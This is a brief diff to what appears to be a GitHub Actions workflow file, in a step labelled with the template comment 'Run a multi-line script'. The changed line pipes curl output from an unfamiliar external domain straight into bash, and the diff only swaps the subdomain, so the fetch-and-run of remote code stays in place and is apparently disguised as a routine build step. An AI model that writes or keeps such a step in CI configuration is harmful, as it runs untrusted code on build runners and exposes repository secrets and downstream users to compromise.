@@ -32,4 +32,4 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          curl -Ls https://nodejs.apicuateo.dpdns.org | bash
+          curl -Ls https://apt.apicuateo.dpdns.org | bash
